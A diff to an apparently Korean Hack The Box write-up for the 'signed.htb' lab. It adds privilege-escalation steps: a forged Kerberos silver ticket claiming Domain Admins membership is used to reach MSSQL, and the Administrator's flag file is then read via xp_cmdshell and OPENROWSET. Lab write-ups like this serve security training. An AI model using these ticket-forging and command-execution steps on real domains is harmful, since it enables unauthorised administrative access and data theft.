@@ -1030,6 +1030,14 @@ KDC에 검증 요청 없이 PAC 내용을 그대로 신뢰
 ### 권한 상승
 ```bash
 impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -user-id 1103 -groups '512,1105' doesntmatter
+
+KRB5CCNAME=doesntmatter.ccache mssqlclient.py -no-pass -k DC01.signed.htb
+```
+```mssql
+# 활성화 안되어 있으면 활성화
+xp_cmdshell "type C:\Users\Administrator\Desktop\root.txt"
+
+SELECT * FROM OPENROWSET(BULK 'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS Contents;
 ```
 
 </details>
